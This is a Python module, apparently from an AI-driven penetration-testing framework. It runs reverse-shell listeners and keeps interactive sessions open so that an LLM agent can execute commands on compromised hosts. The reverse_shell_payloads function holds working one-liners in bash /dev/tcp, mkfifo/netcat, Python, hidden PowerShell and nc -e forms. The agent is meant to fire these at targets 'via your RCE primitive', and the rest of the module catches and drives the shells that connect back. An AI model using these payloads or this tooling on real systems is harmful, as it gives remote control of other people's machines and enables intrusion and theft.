"""Reverse-shell listener + held interactive sessions.

A raw reverse shell has no command/response framing, which an LLM can't drive
reliably. `exec()` fixes that with the standard marker trick: it sends the
command followed by `echo <marker>` and reads until the marker, returning clean
per-command output. Engagement-scoped (one ShellManager per Orchestrator), same
pattern as the background JobManager.
"""
from __future__ import annotations

import socket
import threading
import uuid
from core.timeutil import now_local

RECV_CAP = 16000


def reverse_shell_payloads(ip: str, port: int) -> dict:
    """Ready-to-fire reverse-shell one-liners for the agent to trigger via RCE."""
    return {
        "linux_bash":   f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "linux_sh_fifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "linux_python": (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                         f"s.connect((\"{ip}\",{port}));"
                         f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                         f"subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "linux_nc":     f"nc {ip} {port} -e /bin/sh",
        "windows_powershell": (
            f"powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
        "windows_nc":   f"nc.exe {ip} {port} -e cmd.exe",
    }


class ShellSession:
    def __init__(self, sid: str, sock: socket.socket, addr) -> None:
        self.id = sid
        self.sock = sock
        self.addr = addr
        self.connected_at = now_local()
        self.alive = True
        self.collected = False           # has the orchestrator announced it
        self.os_hint = ""


class ShellManager:
    def __init__(self) -> None:
        self._listeners: dict[int, socket.socket] = {}
        self._sessions: dict[str, ShellSession] = {}
        self._lock = threading.Lock()

    # ── listeners ───────────────────────────────────────────────────────────────

    def start_listener(self, port: int, attacker_ip: str = "") -> dict:
        port = int(port)
        with self._lock:
            if port in self._listeners:
                return {"listening": True, "port": port, "attacker_ip": attacker_ip,
                        "note": "listener already running on this port",
                        "payloads": reverse_shell_payloads(attacker_ip or "ATTACKER_IP", port)}
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", port))
            server.listen(5)
        except OSError as e:
            return {"error": f"could not bind port {port}: {e}"}

        with self._lock:
            self._listeners[port] = server
        t = threading.Thread(target=self._accept_loop, args=(server, port), daemon=True)
        t.start()
        return {
            "listening": True, "port": port, "attacker_ip": attacker_ip,
            "payloads": reverse_shell_payloads(attacker_ip or "ATTACKER_IP", port),
            "note": ("Trigger one of the payloads on the target via your RCE primitive. When it "
                     "connects back, the session appears automatically — drive it with shell_exec."),
        }

    def _accept_loop(self, server: socket.socket, port: int) -> None:
        while True:
            try:
                conn, addr = server.accept()
            except OSError:
                break
            sid = uuid.uuid4().hex[:6]
            with self._lock:
                self._sessions[sid] = ShellSession(sid, conn, addr)

    # ── sessions ────────────────────────────────────────────────────────────────

    def poll_new_sessions(self) -> list[ShellSession]:
        with self._lock:
            new = [s for s in self._sessions.values() if not s.collected]
            for s in new:
                s.collected = True
            return new

    def sessions(self) -> list[dict]:
        with self._lock:
            return [{"id": s.id, "from": f"{s.addr[0]}:{s.addr[1]}",
                     "alive": s.alive, "os_hint": s.os_hint,
                     "connected_at": s.connected_at.isoformat()}
                    for s in self._sessions.values()]

    def has_listeners(self) -> bool:
        with self._lock:
            return bool(self._listeners)

    def exec(self, session_id: str, command: str, timeout: int = 15) -> dict:
        with self._lock:
            sess = self._sessions.get(session_id)
        if sess is None:
            return {"error": f"no shell session {session_id!r}"}
        if not sess.alive:
            return {"error": f"shell session {session_id} is dead"}

        marker = "PENTESTAI_" + uuid.uuid4().hex[:10]
        sock = sess.sock
        try:
            sock.setblocking(True)
            sock.settimeout(0.3)
            self._drain(sock)
            sock.settimeout(timeout)
            sock.sendall((command + "\n").encode())
            sock.sendall(("echo " + marker + "\n").encode())
            data = self._read_until(sock, marker.encode(), timeout)
        except OSError as e:
            sess.alive = False
            return {"error": f"shell {session_id} error: {e}", "_command": f"[shell {session_id}] {command}"}

        text = data.decode("utf-8", errors="replace")
        out = text.split(marker)[0]
        # drop the echoed command line if the shell echoes input
        lines = out.splitlines()
        if lines and command.strip() and command.strip() in lines[0]:
            lines = lines[1:]
        out = "\n".join(lines).strip("\r\n")
        return {"session_id": session_id, "command": command,
                "output": out[:RECV_CAP], "truncated": len(out) > RECV_CAP,
                "_command": f"[shell {session_id}] {command}"}

    @staticmethod
    def _drain(sock: socket.socket) -> None:
        try:
            while True:
                if not sock.recv(4096):
                    break
        except OSError:
            pass

    @staticmethod
    def _read_until(sock: socket.socket, marker: bytes, timeout: int) -> bytes:
        sock.settimeout(timeout)
        buf = bytearray()
        try:
            while len(buf) < RECV_CAP:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if marker in bytes(buf):
                    break
        except socket.timeout:
            pass
        return bytes(buf)

    def stop_all(self) -> None:
        with self._lock:
            for srv in self._listeners.values():
                try:
                    srv.close()
                except Exception:
                    pass
            self._listeners.clear()
            for s in self._sessions.values():
                try:
                    s.sock.close()
                except Exception:
                    pass
